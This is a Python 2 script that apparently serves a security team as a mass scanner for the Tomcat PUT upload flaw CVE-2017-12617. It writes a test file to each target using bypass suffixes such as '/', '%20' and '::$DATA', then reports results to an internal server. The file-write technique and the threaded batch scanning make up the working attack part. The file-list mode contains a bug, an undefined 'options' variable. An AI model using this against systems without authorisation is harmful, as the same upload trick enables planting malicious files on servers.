#!/usr/bin/python
# -*- coding: utf-8 -*-

import requests
import os
import argparse
from requests.exceptions import *
from multiprocessing.dummy import Pool as ThreadPool
import urllib3
urllib3.disable_warnings()
import utils
import logging

interest_status_code = [201, 204]
test_pattern = ["test.txt", "test.txt/", "test.txt%20", "test.txt::$DATA"]
pool = ThreadPool(10)
logging.basicConfig(level=logging.INFO)

def detect_tomcat_put(url):
	(host, port) = utils.process_url(url)
	payload = {'whoami': 'nobody', 'pwned': 'yes'}
	new_url = "http://" + host + ":" + str(port) + "/"
	# logging.info('new url %s', new_url)
	for p in test_pattern:
		try:
			status = requests.put(new_url + p, payload, timeout=2, verify=False).status_code
			r = requests.get(new_url+p, timeout=2)
			if status in interest_status_code and "whoami" in r.text:
				print "[+] CVE-2017-12617 Tomocat PUT Vuln has found with url %s" % url
				return 1
		except SSLError:
			print "[-]An SSL error occurred. {}".format(url)
			return 0
		except HTTPError:
			print "[-] HTTP Error {}" .format(url)
			return 0
		except ConnectionError:
			print "[-] Connection Error {}".format(url)
			return 0
		except ReadTimeout:
			print "[-]The server did not send any data in the allotted amount of time. {}".format(url)
			return 0
		except ChunkedEncodingError:
			print '[-]The connection is reset by the remote host {}'.format(url)
			return 0
	return 0


	
	


def read_from_file(file):
	if os.path.exists(file):
		with open(file, "r") as f:
			url_list = []
			for line in f:
				line = ''.join(line.splitlines())
				if not line.startswith("http"):
					line = "http://" + line
				if not line.endswith("/"):
					line = line + "/"

				url_list.append(line)
		return url_list
	else:
		print "[!] file doesn't exist"


if __name__ == "__main__":
	parser = argparse.ArgumentParser('tomcat vulnerability that allows to put any file onto the server')
	parser.add_argument('-s', '--single', dest='target', help="test single url")
	parser.add_argument('-f', '--file', dest='file', help='test urls from a file')
	parser.add_argument('-b', '--batch', dest='batch', default=False, action="store_true", help="do a batch scan obtaining url list from remote server")
	args = parser.parse_args()
	target = args.target
	file = args.file
	batch = args.batch
	if target and not file and not batch:
		detect_tomcat_put(target)
	elif not target and file and not batch:
		try:
			l = read_from_file(options.file)
			pool.map(detect_tomcat_put, l)

		except Exception, e:
			print e
	elif not target and not file and batch:
		urllist = utils.get_url_list("http://192.168.17.89:8080/RDP/safeTeamUtil/safeTeamUtil!getAllUrls.do")
		if urllist:
			pool = ThreadPool(50)
			results = pool.map(detect_tomcat_put, urllist)
			pool.close()
			pool.join()
			json_data = utils.assembly_data("030202",dict(zip(urllist,results)))
			# print json_data
			r = utils.post_data(json_data, "http://192.168.17.89:8080/RDP/safeTeamUtil/safeTeamUtil!recordVulnerability.do")
			print "Uploading data to remote server, please wait..."
			# time.sleep(2)
			if r:
				print '[+]' , r
			else:
				print "[-]Uploading data failed"
			
	else:
		parser.print_help()
		exit(0)
